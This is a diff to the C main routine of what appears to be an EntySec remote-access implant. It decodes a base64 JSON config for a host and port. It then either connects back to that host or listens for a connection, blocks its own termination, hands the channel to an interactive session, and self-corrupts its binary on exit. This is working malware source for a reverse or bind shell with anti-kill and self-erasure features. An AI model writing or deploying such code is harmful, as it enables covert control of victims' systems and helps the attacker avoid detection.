@@ -1,7 +1,7 @@
 /*
 * MIT License
 *
-* Copyright (c) 2020-2021 EntySec
+* Copyright (c) 2020-2022 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
@@ -24,39 +24,47 @@
 
 #define _GNU_SOURCE
 
-#include <stdlib.h>
+#include <string.h>
 #include <stdio.h>
+#include <stdlib.h>
 
 #include "json.h"
 #include "utils.h"
-#include "crypto.h"
-#include "console.h"
+#include "base64.h"
+
 #include "channel.h"
+#include "console.h"
+
+char data[64] = ":data:string:";
 
 int main(int argc, char *argv[])
 {
-    if (argc > 1) {
-        // redirect_to_null();
+    char *input;
+    prevent_termination();
 
-        // prevent_termination();
-        // prevent_reboot();
+    if (argc < 2)
+        input = decode_base64(data);
+    else
+        input = decode_base64(argv[1]);
 
-        char *input = crypto_decrypt(argv[1]);
-        JSONObject *json = parseJSON(input);
+    JSONObject *json = parseJSON(input);
 
-        char *host = find_json(json, "host");
-        char *port = find_json(json, "port");
+    char *host = find_json(json, "host");
+    char *port = find_json(json, "port");
 
-        freeJSONFromMemory(json);
+    int channel;
 
-        int channel = open_channel(host, atoi(port));
-        if (channel < 0)
-            return -1;
+    if (!host)
+        channel = listen_channel(atoi(port));
+    else
+        channel = open_channel(host, atoi(port));
 
-        interact(channel);
-        close_channel(channel);
-    } else
-        return 1;
+    if (channel < 0)
+        return -1;
 
+    interact(channel);
+    close_channel(channel);
+
+    self_corrupt(argv[0]);
     return 0;
 }
